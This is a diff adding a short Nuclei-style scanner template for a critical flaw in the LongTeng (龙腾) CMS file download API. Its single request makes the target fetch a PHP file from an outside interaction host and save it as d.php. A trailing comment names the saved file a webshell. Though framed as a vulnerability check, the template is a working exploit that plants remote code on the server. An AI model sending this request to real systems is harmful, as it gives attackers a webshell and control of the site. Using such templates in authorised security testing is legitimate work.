@@ -1,0 +1,22 @@
+id: ltcms-multiDownload-upload
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 龙腾-CMS-PermissionAC
+  reference:
+    - http://kpanda.wiki/#/../Vulnhub/L20-4%E9%BE%99%E8%85%BE-CMS-PermissionAC
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/file/multiDownload?file=http://{{interactsh-url}}/1.php&savePath=d.php"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+#webshell：http://ip/d.php 
